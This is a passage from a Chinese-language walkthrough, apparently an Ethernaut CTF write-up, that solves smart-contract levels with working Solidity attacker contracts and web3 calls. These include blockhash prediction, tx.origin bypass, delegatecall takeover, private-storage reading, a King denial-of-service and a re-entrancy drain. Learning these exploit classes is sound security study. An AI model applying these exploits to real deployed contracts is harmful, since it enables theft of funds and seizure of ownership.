+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">flip</span>(<span class="hljs-params">bool _guess</span>) <span class="hljs-title">public</span> <span class="hljs-title">returns</span> (<span class="hljs-params">bool</span>) </span>{
+    uint256 blockValue = uint256(block.blockhash(block.number<span class="hljs-number">-1</span>));
+
+    <span class="hljs-keyword">if</span> (lastHash == blockValue) {
+      revert();
+    }
+
+    lastHash = blockValue;
+    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
+    bool side = coinFlip == <span class="hljs-number">1</span> ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;
+
+    <span class="hljs-keyword">if</span> (side == _guess) {
+      consecutiveWins++;
+      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+    } <span class="hljs-keyword">else</span> {
+      consecutiveWins = <span class="hljs-number">0</span>;
+      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+    }
+  }
+}
+
+contract Attacker {
+  CoinFlip fliphack;
+  uint256 FACTOR = <span class="hljs-number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Attacker</span>(<span class="hljs-params">address target_address</span>) </span>{
+    fliphack = CoinFlip(target_address);
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hack</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
+    uint256 blockValue = uint256(block.blockhash(block.number<span class="hljs-number">-1</span>));
+    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
+    bool predict = coinFlip == <span class="hljs-number">1</span> ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;
+    fliphack.flip(predict);
+  }
+}
+</code></pre>
+<p>&#x90E8;&#x7F72;&#x540E;&#x6267;&#x884C;hack&#x5341;&#x6B21;&#x5373;&#x53EF;</p>
+<p><a href="../assets/images/ethernaut-coinflip.png" data-lightbox="f7000240-95d0-4f54-8c2a-b81cd3029b41" data-title=""><img src="../assets/images/ethernaut-coinflip.png" alt=""></a></p>
+<h2 id="telephone"><a name="telephone" class="anchor-navigation-ex-anchor" href="#telephone"><i class="fa fa-link" aria-hidden="true"></i></a>Telephone</h2>
+<p>&#x5229;&#x7528;<code>tx.origin</code>&#x548C;<code>msg.sender</code>&#x7684;&#x533A;&#x522B;</p>
+<pre><code>With msg.sender the owner can be a contract.
+
+With tx.origin the owner can never be a contract.
+
+In a simple call chain A-&gt;B-&gt;C-&gt;D, inside D msg.sender will be C, and tx.origin will be A.
+</code></pre><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EA;&#x8981;&#x90E8;&#x7F72;&#x4E00;&#x4E2A;&#x5408;&#x7EA6;&#x53BB;&#x8C03;&#x7528;&#x9898;&#x76EE;&#x7684;&#x5408;&#x7EA6;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x5F97;<code>tx.origin!=msg.sender</code></p>
+<pre><code class="lang-js">pragma solidity ^<span class="hljs-number">0.6</span><span class="hljs-number">.0</span>;
+
+contract Telephone {
+
+  address public owner;
+
+  <span class="hljs-keyword">constructor</span>() public {
+    owner = msg.sender;
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">changeOwner</span>(<span class="hljs-params">address _owner</span>) <span class="hljs-title">public</span> </span>{
+    <span class="hljs-keyword">if</span> (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+}
+
+contract Attacker {
+    address target;
+    <span class="hljs-keyword">constructor</span>(address p) public{
+        target = p;
+    }
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hack</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span></span>{
+        Telephone a = Telephone(target);
+        a.changeOwner(msg.sender);
+    }
+}
+</code></pre>
+<h2 id="delegation"><a name="delegation" class="anchor-navigation-ex-anchor" href="#delegation"><i class="fa fa-link" aria-hidden="true"></i></a>Delegation</h2>
+<p>&#x6E90;&#x7801;&#x5982;&#x4E0B;</p>
+<pre><code class="lang-js">pragma solidity ^<span class="hljs-number">0.6</span><span class="hljs-number">.0</span>;
+
+contract Delegate {
+
+  address public owner;
+
+  <span class="hljs-keyword">constructor</span>(address _owner) public {
+    owner = _owner;
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
+    owner = msg.sender;
+  }
+}
+
+contract Delegation {
+
+  address public owner;
+  Delegate delegate;
+
+  <span class="hljs-keyword">constructor</span>(address _delegateAddress) public {
+    delegate = Delegate(_delegateAddress);
+    owner = msg.sender;
+  }
+
+  fallback() external {
+    (bool result, bytes memory data) = address(delegate).delegatecall(msg.data);
+    <span class="hljs-keyword">if</span> (result) {
+      <span class="hljs-keyword">this</span>;
+    }
+  }
+</code></pre>
+<p>&#x8FD9;&#x91CC;<code>Delegation</code>&#x8C03;&#x7528;&#x4E86;<code>Delegate</code>&#x5408;&#x7EA6;,&#x5728;&#x5176;<code>fallback</code>&#x51FD;&#x6570;&#x4E2D; &#x4F7F;&#x7528;&#x4E86;<code>delegatecall</code></p>
+<p>&#x8003;&#x70B9;&#x5728;&#x4E8E; Solidity &#x4E2D;&#x652F;&#x6301;&#x4E24;&#x79CD;&#x5E95;&#x5C42;&#x8C03;&#x7528;&#x65B9;&#x5F0F; <code>call</code>&#x548C; <code>delegatecall</code></p>
+<blockquote>
+<p>call &#x5916;&#x90E8;&#x8C03;&#x7528;&#x65F6;&#xFF0C;&#x4E0A;&#x4E0B;&#x6587;&#x662F;&#x5916;&#x90E8;&#x5408;&#x7EA6;
+delegatecall &#x5916;&#x90E8;&#x8C03;&#x7528;&#x65F6;&#xFF0C;&#x4E0A;&#x4E0B;&#x6587;&#x662F;&#x8C03;&#x7528;&#x5408;&#x7EA6;</p>
+</blockquote>
+<p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x901A;&#x8FC7;<code>address(delegate).delegatecall(msg.data);</code>&#x6211;&#x4EEC;&#x80FD;&#x8C03;&#x7528;<code>delegate</code>&#x7684;&#x4EFB;&#x610F;&#x51FD;&#x6570;</p>
+<p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x53D1;&#x73B0;&#x53EA;&#x8981;&#x8C03;&#x7528;<code>delegate</code>&#x7684;<code>pwn()</code>&#x51FD;&#x6570;&#x5C31;&#x597D;&#x4E86;</p>
+<p>&#x5728;solidty&#x4E2D;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;method id&#xFF08;&#x51FD;&#x6570;&#x9009;&#x62E9;&#x5668;&#xFF09;&#x6765;&#x8C03;&#x7528;&#x51FD;&#x6570;&#xFF0C;&#x6BD4;&#x5982;<code>pwn</code>&#x51FD;&#x6570;&#x7684;<code>method id</code>&#x5C31;&#x662F;<code>keccak256(&quot;pwn()&quot;))</code>&#x53D6;&#x524D;&#x56DB;&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x5728; <code>web3</code> &#x4E2D; <code>sha3</code>&#x5C31;&#x662F; <code>keccak256</code>&#xFF0C;&#x6240;&#x4EE5;&#x6709;&#x5982;&#x4E0B;exp&#xFF1A;</p>
+<pre><code>await contract.sendTransaction({data: web3.utils.sha3(&quot;pwn()&quot;).slice(0,10)});
+</code></pre><h2 id="force"><a name="force" class="anchor-navigation-ex-anchor" href="#force"><i class="fa fa-link" aria-hidden="true"></i></a>Force</h2>
+<p>&#x9898;&#x76EE;&#x8981;&#x6C42;&#x4F7F;&#x5408;&#x7EA6; balance &#x5927;&#x4E8E; 0
+&#x4F46;&#x662F;&#x663E;&#x7136;&#x5408;&#x7EA6;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x63A5;&#x6536;&#x94B1;&#x7684;&#x65B9;&#x6CD5;</p>
+<p>&#x8FD9;&#x91CC;&#x4F7F;&#x7528;&#x5408;&#x7EA6;&#x7684;&#x81EA;&#x6BC1;&#x5F3A;&#x5236;&#x7ED9;&#x9898;&#x76EE;&#x7684;&#x5408;&#x7EA6;&#x8F6C;&#x8D26;</p>
+<pre><code class="lang-js">pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.18</span>;
+
+contract Attacker {
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Attacker</span>(<span class="hljs-params"></span>) <span class="hljs-title">payable</span></span>{}
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hack</span>(<span class="hljs-params">address target</span>) <span class="hljs-title">public</span> </span>{
+        selfdestruct(target);
+    }
+}
+</code></pre>
+<p>&#x7ED9;&#x5408;&#x7EA6;&#x8F6C;&#x70B9;eth&#x7136;&#x540E;&#x8C03;&#x7528;hack&#x81EA;&#x6BC1;</p>
+<h2 id="vault"><a name="vault" class="anchor-navigation-ex-anchor" href="#vault"><i class="fa fa-link" aria-hidden="true"></i></a>Vault</h2>
+<pre><code class="lang-js">pragma solidity ^<span class="hljs-number">0.6</span><span class="hljs-number">.0</span>;
+
+contract Vault {
+  bool public locked;
+  bytes32 private password;
+
+  <span class="hljs-keyword">constructor</span>(bytes32 _password) public {
+    locked = <span class="hljs-literal">true</span>;
+    password = _password;
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unlock</span>(<span class="hljs-params">bytes32 _password</span>) <span class="hljs-title">public</span> </span>{
+    <span class="hljs-keyword">if</span> (password == _password) {
+      locked = <span class="hljs-literal">false</span>;
+    }
+  }
+}
+</code></pre>
+<p>&#x533A;&#x5757;&#x94FE;&#x4E0A;&#x7684;&#x4FE1;&#x606F;&#x662F;&#x5B8C;&#x5168;&#x516C;&#x5F00;&#x7684; 
+private &#x53D8;&#x91CF;&#x4E0D;&#x80FD;&#x88AB;&#x522B;&#x7684;&#x5408;&#x7EA6;&#x8BBF;&#x95EE;&#xFF0C;
+&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;web3&#x7684;getStorage&#x51FD;&#x6570;&#x83B7;&#x53D6;&#x5230;&#x3002;</p>
+<p>&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x4E0B;&#x9762;&#x8FD9;&#x4E2A;poc &#x5F97;&#x5230;&#x5408;&#x7EA6;&#x5B9E;&#x4F8B;<code>instance</code>&#x7684;&#x4EFB;&#x610F;&#x5757;</p>
+<pre><code class="lang-js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getStorageAt</span> (<span class="hljs-params">address, idx</span>) </span>{
+  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span> (<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">resolve, reject</span>) </span>{
+    web3.eth.getStorageAt(address, idx, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">error, result</span>) </span>{
+      <span class="hljs-keyword">if</span> (error) {
+        reject(error);
+      } <span class="hljs-keyword">else</span> {
+        resolve(result);
+      }
+    })
+})}
+</code></pre>
+<p>&#x6211;&#x4EEC;&#x8981;&#x7684;&#x662F;&#x7B2C;&#x4E00;&#x5757;&#xFF08;&#x4ECE;&#x7B2C;0&#x5757;&#x5F00;&#x59CB;&#x8BA1;&#x7B97;&#xFF09;</p>
+<pre><code class="lang-js"><span class="hljs-keyword">await</span> getStorageAt(instance, <span class="hljs-number">1</span>);
+</code></pre>
+<p><code>web3.utils.hexToAscii</code>&#x5C31;&#x80FD;&#x770B;&#x5230;&#x5BC6;&#x7801;</p>
+<p>&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x4EE5;bytes32&#x7684;&#x5F62;&#x5F0F;&#x8F93;&#x5165;&#xFF0C;&#x4E5F;&#x5373;</p>
+<pre><code class="lang-js">contract.unlock(<span class="hljs-string">&quot;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&quot;</span>)
+</code></pre>
+<h2 id="king"><a name="king" class="anchor-navigation-ex-anchor" href="#king"><i class="fa fa-link" aria-hidden="true"></i></a>King</h2>
+<p>&#x6E90;&#x7801;&#x5982;&#x4E0B;</p>
+<pre><code class="lang-js">pragma solidity ^<span class="hljs-number">0.6</span><span class="hljs-number">.0</span>;
+
+contract King {
+
+  address payable king;
+  uint public prize;
+  address payable public owner;
+
+  <span class="hljs-keyword">constructor</span>() public payable {
+    owner = msg.sender;  
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  fallback() external payable {
+    <span class="hljs-built_in">require</span>(msg.value &gt;= prize || msg.sender == owner);
+    king.transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_king</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params">address payable</span>) </span>{
+    <span class="hljs-keyword">return</span> king;
+  }
+}
+</code></pre>
+<p>&#x9898;&#x76EE;&#x8981;&#x6C42;&#x59CB;&#x7EC8;&#x4E3A;King&#xFF0C;&#x90A3;&#x4E48;&#x53EA;&#x8981;&#x5728;&#x6210;&#x4E3A;King&#x540E;&#x963B;&#x6B62;&#x4E0B;&#x4E00;&#x7B14;&#x4EA4;&#x6613;&#x5373;&#x53EF;</p>
+<p>&#x53EF;&#x4EE5;&#x7F16;&#x5199;&#x4E00;&#x4E2A;&#x6CA1;&#x6709;<code>payable</code>&#x4FEE;&#x9970;&#x7684;fallback&#x7684;&#x5408;&#x7EA6;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x963B;&#x6B62;<code>king.transfer</code>&#x6267;&#x884C;</p>
+<pre><code class="lang-js">pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.18</span>;
+
+contract Attacker{
+    <span class="hljs-keyword">constructor</span>(address target) public payable{
+        target.call.gas(<span class="hljs-number">1000000</span>).value(msg.value)();
+    }
+}
+</code></pre>
+<h2 id="re-entrancy"><a name="re-entrancy" class="anchor-navigation-ex-anchor" href="#re-entrancy"><i class="fa fa-link" aria-hidden="true"></i></a>Re-entrancy</h2>
+<p>Exp</p>
+<pre><code class="lang-js">pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.18</span>;
+
+contract Reentrance {
+
+  mapping(address =&gt; uint) public balances;
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">donate</span>(<span class="hljs-params">address _to</span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>{
+    balances[_to] += msg.value;
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">balanceOf</span>(<span class="hljs-params">address _who</span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint balance</span>) </span>{
+    <span class="hljs-keyword">return</span> balances[_who];
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params">uint _amount</span>) <span class="hljs-title">public</span> </span>{
+    <span class="hljs-keyword">if</span>(balances[msg.sender] &gt;= _amount) {
+      <span class="hljs-keyword">if</span>(msg.sender.call.value(_amount)()) { <span class="hljs-comment">//&#x95EE;&#x9898;&#x5728;&#x4E8E;&#x8FD9;&#x91CC; &#x8C03;&#x7528;&#x4E86; sender &#x5982;&#x679C;sender&#x7684;fallback&#x4E5F;withdraw&#xFF08;&#x6B64;&#x65F6;balance&#x5C1A;&#x672A;&#x88AB;&#x4FEE;&#x6539;&#xFF09; &#x5C31;&#x4F1A;&#x9020;&#x6210;&#x9012;&#x5F52;&#x91CD;&#x5165;&#x653B;&#x51FB;</span>
+        _amount;
+      }
+      balances[msg.sender] -= _amount;
+    }
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>{}
+}
+<span class="hljs-comment">//&#x7F16;&#x5199;&#x5982;&#x4E0B;&#x5408;&#x7EA6;</span>
+contract Attacker {
+
+    address instance_address = instance_address;
+    Reentrance target = Reentrance(instance_address);
+    uint public amount = <span class="hljs-number">1</span> ether;  
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Attack</span>(<span class="hljs-params"></span>) <span class="hljs-title">payable</span></span>{}
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">donate</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>{
+        target.donate.value(amount).gas(<span class="hljs-number">4000000</span>)(address(<span class="hljs-keyword">this</span>));
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_balance</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span>(<span class="hljs-params">uint</span>) </span>{
+        <span class="hljs-keyword">return</span> target.balanceOf(<span class="hljs-keyword">this</span>);
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">my_balance</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span>(<span class="hljs-params">uint</span>) </span>{
+        <span class="hljs-keyword">return</span> address(<span class="hljs-keyword">this</span>).balance;
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">target_balance</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span>(<span class="hljs-params">uint</span>) </span>{
+        <span class="hljs-keyword">return</span> instance_address.balance;
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hack</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
+        target.withdraw(<span class="hljs-number">0.5</span> ether);
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">retrive</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
+        selfdestruct(player_address);
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>{
+        target.withdraw(<span class="hljs-number">0.5</span> ether);
+    }
+}
+</code></pre>
+<p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x521B;&#x5EFA;&#x5408;&#x7EA6;&#x7ED9;Reentrance&#x8F6C;1eth&#xFF0C;&#x7136;&#x540E;&#x518D;&#x9000;&#x6B3E;0.5eth&#xFF0C;&#x5408;&#x7EA6;&#x5C31;&#x4F1A;&#x8C03;&#x7528;&#x6211;&#x4EEC;&#x7684;fallback&#x4E0D;&#x65AD;&#x9000;&#x6B3E;0.5eth&#xFF0C;&#x6700;&#x7EC8;&#x9000;&#x5230;0eth&#x5B8C;&#x6210;&#x653B;&#x51FB;</p>
+<h2 id="elevator"><a name="elevator" class="anchor-navigation-ex-anchor" href="#elevator"><i class="fa fa-link" aria-hidden="true"></i></a>Elevator</h2>
+<p>&#x53EA;&#x8981;&#x7F16;&#x5199;&#x4E00;&#x4E2A;&#x7B2C;&#x4E00;&#x6B21;&#x8FD4;&#x56DE;false&#xFF0C;&#x7B2C;&#x4E8C;&#x6B21;&#x8FD4;&#x56DE;true&#x7684;islastFoor()&#x5C31;&#x884C;&#x4E86;</p>
+<pre><code class="lang-js">pragma solidity ^<span class="hljs-number">0.6</span><span class="hljs-number">.0</span>;
+
+
+interface Building {
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isLastFloor</span>(<span class="hljs-params">uint</span>) <span class="hljs-title">external</span> <span class="hljs-title">returns</span> (<span class="hljs-params">bool</span>);
+}
+
+
+<span class="hljs-title">contract</span> <span class="hljs-title">Elevator</span> </span>{
+  bool public top;
+  uint public floor;
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">goTo</span>(<span class="hljs-params">uint _floor</span>) <span class="hljs-title">public</span> </span>{
+    Building building = Building(msg.sender);
+
+    <span class="hljs-keyword">if</span> (! building.isLastFloor(_floor)) {
+      floor = _floor;
+      top = building.isLastFloor(floor);
+    }
+  }
+}
+
+contract Attacker is Building{
+    bool public lastFloor = <span class="hljs-literal">true</span>;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isLastFloor</span>(<span class="hljs-params">uint</span>) <span class="hljs-title">override</span> <span class="hljs-title">external</span> <span class="hljs-title">returns</span> (<span class="hljs-params">bool</span>)</span>{
+        lastFloor = !lastFloor;
+        <span class="hljs-keyword">return</span> lastFloor;
+    }
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">go</span>(<span class="hljs-params">address p</span>)<span class="hljs-title">public</span></span>{
+        Elevator target = Elevator(p);
+        target.goTo(<span class="hljs-number">1024</span>);
+    }
+}
+</code></pre>
+<h2 id="privacy"><a name="privacy" class="anchor-navigation-ex-anchor" href="#privacy"><i class="fa fa-link" aria-hidden="true"></i></a>Privacy</h2>
+<p>&#x548C;<code>Vault</code>&#x90A3;&#x9898;&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x94FE;&#x4E0A;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x53EA;&#x8981;&#x627E;&#x5230;&#x5BC6;&#x7801;&#x5C31;&#x884C;&#x4E86;</p>
+<pre><code class="lang-js">pragma solidity ^<span class="hljs-number">0.6</span><span class="hljs-number">.0</span>;
+
+contract Privacy {
+
+  bool public locked = <span class="hljs-literal">true</span>;
+  uint256 public ID = block.timestamp;
+  uint8 private flattening = <span class="hljs-number">10</span>;
+  uint8 private denomination = <span class="hljs-number">255</span>;
+  uint16 private awkwardness = uint16(now);
+  bytes32[<span class="hljs-number">3</span>] private data;
+
+  <span class="hljs-keyword">constructor</span>(bytes32[3] memory _data) public {
+    data = _data;
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unlock</span>(<span class="hljs-params">bytes16 _key</span>) <span class="hljs-title">public</span> </span>{
+    <span class="hljs-built_in">require</span>(_key == bytes16(data[<span class="hljs-number">2</span>]));
+    locked = <span class="hljs-literal">false</span>;
+  }
+
+  <span class="hljs-comment">/*
+    A bunch of super advanced solidity algorithms...
+
+      ,*&apos;^`*.,*&apos;^`*.,*&apos;^`*.,*&apos;^`*.,*&apos;^`*.,*&apos;^`
+      .,*&apos;^`*.,*&apos;^`*.,*&apos;^`*.,*&apos;^`*.,*&apos;^`*.,*&apos;^`*.,
+      *.,*&apos;^`*.,*&apos;^`*.,*&apos;^`*.,*&apos;^`*.,*&apos;^`*.,*&apos;^`*.,*&apos;^         ,---/V\
+      `*.,*&apos;^`*.,*&apos;^`*.,*&apos;^`*.,*&apos;^`*.,*&apos;^`*.,*&apos;^`*.,*&apos;^`*.    ~|__(o.o)
+      ^`*.,*&apos;^`*.,*&apos;^`*.,*&apos;^`*.,*&apos;^`*.,*&apos;^`*.,*&apos;^`*.,*&apos;^`*.,*&apos;  UU  UU
+  */</span>
+}
+</code></pre>
+<pre><code class="lang-js"><span class="hljs-keyword">await</span> getStorageAt(contract.address,<span class="hljs-number">0</span>)
+<span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000001&quot;</span> 
+<span class="hljs-keyword">await</span> getStorageAt(contract.address,<span class="hljs-number">1</span>)
+<span class="hljs-string">&quot;0x000000000000000000000000000000000000000000000000000000006038b197&quot;</span>
+<span class="hljs-keyword">await</span> getStorageAt(contract.address,<span class="hljs-number">2</span>)
+<span class="hljs-string">&quot;0x00000000000000000000000000000000000000000000000000000000b197ff0a&quot;</span>
+<span class="hljs-keyword">await</span> getStorageAt(contract.address,<span class="hljs-number">3</span>)
+<span class="hljs-string">&quot;0xb6bc9f153154dff759f623ce8256aacfd7b14484f05a6c703d51c73f0451d29a&quot;</span>
+<span class="hljs-keyword">await</span> getStorageAt(contract.address,<span class="hljs-number">4</span>)
+<span class="hljs-string">&quot;0xe213d07e42d82c8128979b3a012a875ab2155b5fb0ad63a16affff197c581ee4&quot;</span>
+<span class="hljs-keyword">await</span> getStorageAt(contract.address,<span class="hljs-number">5</span>)
+<span class="hljs-string">&quot;0x9550a97555a5da445052aa4d6f448148de4464404672366088720800427c52b9&quot;</span>
+<span class="hljs-keyword">await</span> getStorageAt(contract.address,<span class="hljs-number">6</span>)
+<span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span>
+<span class="hljs-keyword">await</span> getStorageAt(contract.address,<span class="hljs-number">7</span>)
+<span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span>
+</code></pre>
+<p>&#x4E00;&#x5757;32&#x5B57;&#x8282;</p>
+<pre><code>&#x6839;&#x636E; Solidity &#x4F18;&#x5316;&#x89C4;&#x5219;&#xFF0C;&#x5F53;&#x53D8;&#x91CF;&#x6240;&#x5360;&#x7A7A;&#x95F4;&#x5C0F;&#x4E8E; 32 &#x5B57;&#x8282;&#x65F6;&#xFF0C;&#x4F1A;&#x4E0E;&#x540E;&#x9762;&#x7684;&#x53D8;&#x91CF;&#x5171;&#x4EAB;&#x7A7A;&#x95F4;&#xFF0C;&#x5982;&#x679C;&#x52A0;&#x4E0A;&#x540E;&#x9762;&#x7684;&#x53D8;&#x91CF;&#x4E5F;&#x4E0D;&#x8D85;&#x8FC7; 32 &#x5B57;&#x8282;&#x7684;&#x8BDD;&#x3002;
+</code></pre><p>&#x5BF9;&#x5E94;</p>
+<pre><code class="lang-js">bool public locked = <span class="hljs-literal">true</span>;
+<span class="hljs-comment">//&quot;0x0000000000000000000000000000000000000000000000000000000000000001&quot;</span>
+uint256 public ID = block.timestamp;
+<span class="hljs-comment">//&quot;0x000000000000000000000000000000000000000000000000000000006038b197&quot;</span>
+uint8 private flattening = <span class="hljs-number">10</span>; <span class="hljs-comment">//1</span>
+uint8 private denomination = <span class="hljs-number">255</span>;<span class="hljs-comment">//1</span>
+uint16 private awkwardness = uint16(now);<span class="hljs-comment">//2</span>
+<span class="hljs-comment">//&quot;0x00000000000000000000000000000000000000000000000000000000b197ff0a&quot;</span>
+bytes32[<span class="hljs-number">3</span>] private data;
+<span class="hljs-comment">//&quot;0xb6bc9f153154dff759f623ce8256aacfd7b14484f05a6c703d51c73f0451d29a&quot;</span>
+<span class="hljs-comment">//&quot;0xe213d07e42d82c8128979b3a012a875ab2155b5fb0ad63a16affff197c581ee4&quot;</span>
+<span class="hljs-comment">//&quot;0x9550a97555a5da445052aa4d6f448148de4464404672366088720800427c52b9&quot;</span>
+</code></pre>
+<p>&#x6240;&#x4EE5;<code>data[2]=&quot;0x9550a97555a5da445052aa4d6f448148de4464404672366088720800427c52b9&quot;</code> </p>
+<p><code>byte16(data[2])</code>&#x5C31;&#x662F;<code>data[2]</code>&#x7684;&#x524D;16&#x4E2A;&#x5B57;&#x8282;</p>
+<pre><code class="lang-js">contract.unlock(<span class="hljs-string">&quot;0x9550a97555a5da445052aa4d6f448148&quot;</span>)
+</code></pre>
+<h2 id="gatekeepertwo"><a name="gatekeepertwo" class="anchor-navigation-ex-anchor" href="#gatekeepertwo"><i class="fa fa-link" aria-hidden="true"></i></a>GateKeeperTwo</h2>
+<pre><code class="lang-js">pragma solidity ^<span class="hljs-number">0.6</span><span class="hljs-number">.0</span>;
+
+contract GatekeeperTwo {
+
+  address public entrant;
+
+  modifier gateOne() {
+    <span class="hljs-built_in">require</span>(msg.sender != tx.origin);
+    _;
+  }
+
+  modifier gateTwo() {
+    uint x;
+    assembly { x := extcodesize(caller()) }
+    <span class="hljs-built_in">require</span>(x == <span class="hljs-number">0</span>);
+    _;
+  }
+
+  modifier gateThree(bytes8 _gateKey) {
+    <span class="hljs-built_in">require</span>(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(<span class="hljs-number">0</span>) - <span class="hljs-number">1</span>);
+    _;
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">enter</span>(<span class="hljs-params">bytes8 _gateKey</span>) <span class="hljs-title">public</span> <span class="hljs-title">gateOne</span> <span class="hljs-title">gateTwo</span> <span class="hljs-title">gateThree</span>(<span class="hljs-params">_gateKey</span>) <span class="hljs-title">returns</span> (<span class="hljs-params">bool</span>) </span>{
+    entrant = tx.origin;
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+  }
+}
+</code></pre>
+<p>gateOne&#x5199;&#x5408;&#x7EA6;&#x5C31;&#x884C;</p>
+<p>gateTwo&#x5229;&#x7528;&#x4E86;</p>
+<blockquote>
+<p>Note that while the initialisation code is executing, the newly created address exists but with no intrinsic body code.
+&#x2026;&#x2026;
+During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account while CODESIZE should return the length of the initialization code.</p>
+</blockquote>
+<p>&#x4E5F;&#x5C31;&#x662F;&#x5728;&#x8C03;&#x7528;&#x6784;&#x9020;&#x51FD;&#x6570;&#x5408;&#x7EA6;&#x65F6;&#xFF0C;&#x5730;&#x5740;&#x751F;&#x6210;&#x4F46;&#x662F;&#x4EE3;&#x7801;&#x8FD8;&#x6CA1;&#x6709;&#x52A0;&#x5230;&#x94FE;&#x4E0A;&#x6B64;&#x65F6;extcodersize=0,&#x5229;&#x7528;&#x6784;&#x9020;&#x51FD;&#x6570;&#x7ED5;&#x8FC7;</p>
+<p>&#x6240;&#x4EE5;&#x6709;&#x5982;&#x4E0B;exp</p>
